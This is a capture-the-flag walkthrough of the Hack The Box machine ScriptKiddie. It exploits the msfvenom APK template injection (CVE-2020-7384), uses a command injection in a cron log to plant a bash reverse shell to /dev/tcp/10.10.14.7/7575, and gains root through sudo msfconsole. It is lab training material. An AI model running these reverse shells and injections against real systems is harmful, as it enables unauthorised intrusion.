---
title:     "Hack The Box - ScriptKiddie"
tags: [linux,easy]
categories: HackTheBox
---
[![box card](/img/scriptkiddie/info_card.png)](/img/scriptkiddie/info_card.png)

ScriptKiddie is an easy rated machine on HackTheBox by [0xdf](https://www.hackthebox.eu/home/users/profile/4935). For the user part we will exploit a web application that let's us generate mfsvenom files with templates abusing [CVE-2020-7384](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/). This gives us a shell as the user `kid`, from whom we pivot to the user `pwn` abusing a running cronjob with another command injection. As `pwn` we can run `msfconsole` as root,  which let's us drop into a rootshell executing bash.

# User
## Nmap
As usual we start our enumeration on the target with an allports nmap scan to capture the whole attack surface, followed by a script and version detection scan to obtain more detailed information on the open ports.

`Nmap allports`

```
$ sudo nmap -p- -T4 10.129.153.127
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 06:12 UTC
Nmap scan report for 10.129.153.127
Host is up (0.073s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 46.68 seconds
```

`Nmap script and version scan`

```
$ sudo nmap -p22,5000 -sC -sV 10.129.153.127
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 06:16 UTC
Nmap scan report for 10.129.153.127
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
```

## Msfvenom template
Going over to the werbserver on port 5000 we can see that it is offering 3 different applications.

[![website](/img/scriptkiddie/website.png)](/img/scriptkiddie/website.png)

We can scan a host with nmap entering an ip, generate `msfvenom` payloads with templates and also perform a `searchsploit` search. Scanning localhost with the nmap service we don't get any additional information. The interesting thing here is the payload generation with a template because it is vulnerable to [CVE-2020-7384](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/).
This works by exploiting a command injection vulnerability in msfvenom when generating an `apk` payload with a template file.
In a first step we will generate the malicious apk file using the msf module `unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`.

```
       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2132 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services

[*] Starting persistent handler(s)...
msf6 > use unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.14.7
lhost => 10.10.14.7
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lport 7575
lport => 7575
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/jack/.msf4/local/msf.apk
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > 
```

Next we set up our `ncat` listener on the selected port.

```
$nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

With preparations set we can now generate the `msfvenom` payload with our malicious `apk` template.

[![payload_web](/img/scriptkiddie/payload_web.png)](/img/scriptkiddie/payload_web.png)

After a short moment we get a hit back on our `ncat` listener and upgrade the shell. Now we can grab the user flag in `/home/kid`.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.153.127.
Ncat: Connection from 10.129.153.127:47952.
python3 -c 'import pty;pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ export TERM=xterm
export TERM=xterm
kid@scriptkiddie:~/html$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

kid@scriptkiddie:~/html$ stty rows 55 cols 236
kid@scriptkiddie:~/html$
```

```
kid@scriptkiddie:~$ wc -c user.txt 
33 user.txt
```

# Root

## Command injection #2
Looking around in the other users home directory we find the script `scanlosers.sh`. This script reads the logfile in `home/kid/logs/hackers` takes the third argument in each row, seperated by a space and runs a nmap script against it. This is also vulnerable to a simple command injection, which we can use to gain a shell as the user pwn.

```
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

First we set up our listener again.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Then we place our command injection in the logfile and recieve an instant shell on the target.

```
kid@scriptkiddie:/home/pwn$ echo 'x x ;bash -c "bash -i >& /dev/tcp/10.10.14.7/7575 0>&1;"' > /home/kid/logs/hackers
```

We upgrade our shell again and continue on our way to root.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.153.127.
Ncat: Connection from 10.129.153.127:48198.
bash: cannot set terminal process group (803): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
pwn@scriptkiddie:~$ export TERM=xterm
export TERM=xterm
pwn@scriptkiddie:~$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

pwn@scriptkiddie:~$ stty rows 55 cols 236
pwn@scriptkiddie:~$
```

## Sudo on Metasploit

Checking the sudo permission we see that pwn can run msfconsole as root. Since we can issue os commands inside msf, this gives us an easy way to escalate to root.

```
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

We start up msfconsole with sudo and execute `/bin/bash`.

```
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
```

This drops us into a rootshell and we can grab the rootflag.

```
msf6 > /bin/bash
[*] exec: /bin/bash

root@scriptkiddie:/home/pwn# id
uid=0(root) gid=0(root) groups=0(root)
root@scriptkiddie:/home/pwn# wc -c /root/root.txt
33 /root/root.txt
root@scriptkiddie:/home/pwn# 
```
